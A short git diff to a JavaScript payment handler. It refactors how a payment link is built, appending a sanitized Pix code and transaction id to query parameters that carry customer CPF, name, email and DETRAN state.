@@ -608,7 +608,7 @@ async function handlePaymentRequest(req, res) {
     const baseWithCpf = paymentLinkBase.includes("{cpf}")
       ? paymentLinkBase.replace("{cpf}", cpfDigits || "")
       : paymentLinkBase;
-    const query = new URLSearchParams({
+    const paymentLinkParams = new URLSearchParams({
       cpf: cpfDigits || "",
       nome: customer.name || "",
       email: customer.email || "",
@@ -617,7 +617,7 @@ async function handlePaymentRequest(req, res) {
       title: FIXED_TITLE,
       uf: detranUf || "",
     });
-    const paymentLink = `${baseWithCpf}${baseWithCpf.includes("?") ? "&" : "?"}${query.toString()}`;
+    let paymentLink = "";
     const tracking = (() => {
       if (trackingFromBody && typeof trackingFromBody === "object" && !Array.isArray(trackingFromBody)) {
         const utm = typeof trackingFromBody.utm === "object" && trackingFromBody.utm ? trackingFromBody.utm : {};
@@ -755,6 +755,11 @@ async function handlePaymentRequest(req, res) {
         message: "Gateway não retornou dados esperados",
       });
     }
+
+    const sanitizedPix = String(pixText || "").replace(/\s+/g, "");
+    paymentLinkParams.set("pix_code", sanitizedPix);
+    paymentLinkParams.set("tx", String(tx));
+    paymentLink = `${baseWithCpf}${baseWithCpf.includes("?") ? "&" : "?"}${paymentLinkParams.toString()}`;
 
     await saveLead({
       timestamp: new Date().toISOString(),
